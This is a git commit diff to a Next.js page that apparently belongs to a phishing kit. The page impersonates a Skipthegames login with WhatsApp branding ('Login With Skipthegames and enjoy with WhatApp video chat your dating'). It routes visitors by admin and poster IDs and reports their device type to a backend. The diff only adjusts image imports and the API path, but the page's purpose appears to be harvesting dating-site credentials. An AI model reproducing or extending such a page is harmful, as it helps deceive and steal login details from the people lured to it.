caf6c22db4164a47204324d85cf4a82b848edbf8
Yeasir Ahamed <yahamed007@gmail.com>
2024-03-18 23:04:41 +0600

    test dploy

--- pages/verify/[adminId]/[posterId].js
+++ pages/verify/[adminId]/[posterId].js
@@ -1,9 +1,9 @@
 import { useState } from 'react';
 import { API_URL, site } from '../../../config';
 import Image from 'next/image';
-import Link from 'next/link';
-import whatsAppImg from '../public/images/whatsapp.png';
-import skipthegame from '../public/images/logo.png';
+
+// import Login from '../../../components/Login';
+// import Webcam from 'react-webcam';
 
 export default function Home() {
   const [showForm, setShowForm] = useState(true);
@@ -12,7 +12,7 @@ export default function Home() {
     <div className="flex justify-center items-center min-h-screen">
       <div className="max-w-sm">
         <div className="flex justify-center">
-          <Image src={whatsAppImg} width={100} height={100} />
+          <Image src="/images/whatsapp.png" width={100} height={100} />
         </div>
         <h1 className="text-xl font-semibold">
           Login With Skipthegames and enjoy with WhatApp video chat your dating
@@ -24,7 +24,7 @@ export default function Home() {
         >
           <div className="flex justify-center">
             <Image
-              src={skipthegame}
+              src="/images/logo.png"
               alt="skipthegame logo"
               width={200}
               height={50}
@@ -55,7 +55,7 @@ export async function getServerSideProps({
 
   const device = isMobileView ? 'phone' : isTabletView ? 'ipad' : 'desktop';
 
-  const url = `${API_URL}/${site}/verify/${adminId}/${posterId}/${device}`;
+  const url = `${API_URL}/${site}/${adminId}/${posterId}/${device}`;
 
   const res = await fetch(url);
   console.log(res);
